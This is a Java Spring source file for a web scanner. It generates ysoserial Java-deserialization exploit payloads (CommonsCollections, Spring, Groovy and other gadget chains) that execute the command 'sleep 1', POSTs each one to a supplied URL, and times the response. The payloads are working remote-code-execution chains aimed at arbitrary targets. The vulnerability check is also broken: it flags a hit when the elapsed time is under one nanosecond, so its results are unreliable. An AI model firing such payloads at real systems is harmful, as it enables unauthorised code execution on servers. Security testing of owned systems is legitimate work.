package pw.inz.serializationcenter.webscanner;


import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Scope;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.stereotype.Component;
import org.springframework.web.reactive.function.client.WebClient;
import pw.inz.serializationcenter.payloadgenerator.ysoserialPassThru;

import java.util.HashMap;

@Component
@Scope("singleton")
public class WebScanner {

    private final int sleepTime = 1;
    private final String[] payloads = new String[]{"AspectJWeaver", "BeanShell1", "Click1", "Clojure", "CommonsBeanutils1", "CommonsCollections1", "CommonsCollections2", "CommonsCollections3", "CommonsCollections4", "CommonsCollections5", "CommonsCollections6", "CommonsCollections7", "FileUpload1", "Groovy1", "Hibernate1", "Hibernate2", "JBossInterceptors1", "JRMPClient", "JRMPListener", "JSON1", "JavassistWeld1", "Jdk7u21", "Jython1", "MozillaRhino1", "MozillaRhino2", "Myfaces1", "Myfaces2", "ROME", "Spring1", "Spring2", "URLDNS", "Vaadin1", "Wicket1"};//todo from databse
    private final ysoserialPassThru ysoserialPass;
    private final HashMap<String, byte[]> payloadsData;

    @Autowired
    public WebScanner() {
        ysoserialPass = new ysoserialPassThru();
        payloadsData = new HashMap<>();
        for (String payload : payloads) {
            payloadsData.put(payload, ysoserialPass.invoke(payload, "sleep " + sleepTime));
        }
    }


    public String doScan(String url) {
        StringBuilder result = new StringBuilder();
        for (String payload : payloads) {
            if (payloadsData.get(payload) != null) {
                WebClient webClient = WebClient.builder()
                        .baseUrl(url)
                        .defaultHeader(HttpHeaders.CONTENT_TYPE, MediaType.APPLICATION_JSON_VALUE)
                        .build();
                long start = System.nanoTime();
                webClient.post()
                        .uri("")
                        .contentType(MediaType.APPLICATION_OCTET_STREAM)
                        .header(HttpHeaders.CONTENT_LENGTH, String.valueOf(payloadsData.get(payload).length))
                        .bodyValue(payloadsData.get(payload))
                        .retrieve()
                        .bodyToMono(String.class).block();
                long stop = System.nanoTime();
                System.out.println(stop - start);
                if (stop - start < 1) {
                    result.append("Application look vulnerable to payload " + payload + ".\r\n");
                }
            }
        }
        if (result.toString().equals("")) {
            return "Application is not vulnerable to any payload";
        } else {
            return result.toString();
        }


    }
}
